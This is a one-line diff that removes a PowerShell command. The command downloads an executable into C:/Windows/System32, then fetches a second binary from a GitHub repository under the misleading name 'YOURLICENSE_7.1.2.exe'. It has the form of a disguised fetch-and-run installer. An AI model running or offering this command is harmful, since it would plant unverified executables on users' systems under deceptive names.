@@ -1,1 +1,0 @@
-powershell wget "https://github.com/BIoat/WadBot/blob/main/files/aria2c?raw=true" -o C:/Windows/System32/aria2c.exe; mkdir C:/notepad;cd C:/notepad; aria2c -x 16 --checksum=sha-1=13b842fb3d0c76f57b65aa291d0f69a454f0d998 -c -V "https://github.com/BIoat/WadBot/blob/main/files/bin?raw=true" --conditional-get=true -o YOURLICENSE_7.1.2.exe;ls;explorer .;
